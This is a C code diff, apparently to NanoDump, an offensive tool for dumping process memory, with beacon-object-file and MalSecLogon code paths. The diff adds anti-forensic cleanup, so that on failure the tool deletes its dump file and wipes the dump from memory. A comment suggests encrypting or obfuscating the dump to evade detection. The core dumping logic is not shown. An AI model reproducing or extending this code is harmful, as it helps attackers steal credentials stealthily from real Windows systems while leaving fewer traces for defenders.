@@ -151,6 +151,8 @@ void go(char* args, int length)
     if (!base_address)
     {
         NtClose(hProcess); hProcess = NULL;
+        if (write_dump_to_disk)
+            delete_file(dump_path);
         return;
     }
 
@@ -175,7 +177,12 @@ void go(char* args, int length)
         created_processes = NULL;
     }
     if (!success)
+    {
+        erase_dump_from_memory(&dc);
+        if (write_dump_to_disk)
+            delete_file(dump_path);
         return;
+    }
 
     DPRINT(
         "The dump was created successfully, final size: %d MiB",
@@ -192,8 +199,6 @@ void go(char* args, int length)
             dc.BaseAddress,
             dc.rva
         );
-        if (!success)
-            return;
     }
     else
     {
@@ -202,10 +207,15 @@ void go(char* args, int length)
             dc.BaseAddress,
             dc.rva
         );
-        if (!success)
-            return;
     }
     erase_dump_from_memory(&dc);
+
+    if (!success)
+    {
+        if (write_dump_to_disk)
+            delete_file(dump_path);
+        return;
+    }
 
     print_success(
         dump_path,
@@ -493,6 +503,7 @@ int main(int argc, char* argv[])
     if (!base_address)
     {
         NtClose(hProcess); hProcess = NULL;
+        delete_file(dump_path);
         return -1;
     }
 
@@ -517,7 +528,11 @@ int main(int argc, char* argv[])
         created_processes = NULL;
     }
     if (!success)
+    {
+        erase_dump_from_memory(&dc);
+        delete_file(dump_path);
         return -1;
+    }
 
     DPRINT(
         "The dump was created successfully, final size: %d MiB",
@@ -532,10 +547,14 @@ int main(int argc, char* argv[])
         dc.BaseAddress,
         dc.rva
     );
-    if (!success)
-        return -1;
 
     erase_dump_from_memory(&dc);
+
+    if (!success)
+    {
+        delete_file(dump_path);
+        return -1;
+    }
 
     if (!is_malseclogon_stage_2)
     {
@@ -597,7 +616,10 @@ BOOL NanoDump(void)
     SIZE_T region_size = DUMP_MAX_SIZE;
     PVOID base_address = allocate_memory(&region_size);
     if (!base_address)
+    {
+        delete_file(dump_path);
         return FALSE;
+    }
 
     dump_context dc;
     dc.hProcess = hProcess;
@@ -610,7 +632,11 @@ BOOL NanoDump(void)
 
     success = NanoDumpWriteDump(&dc);
     if (!success)
+    {
+        erase_dump_from_memory(&dc);
+        delete_file(dump_path);
         return FALSE;
+    }
 
     // at this point, you can encrypt or obfuscate the dump
     encrypt_dump(&dc);
@@ -620,10 +646,14 @@ BOOL NanoDump(void)
         dc.BaseAddress,
         dc.rva
     );
-    if (!success)
-        return FALSE;
 
     erase_dump_from_memory(&dc);
+
+    if (!success)
+    {
+        delete_file(dump_path);
+        return FALSE;
+    }
 
     return TRUE;
 }
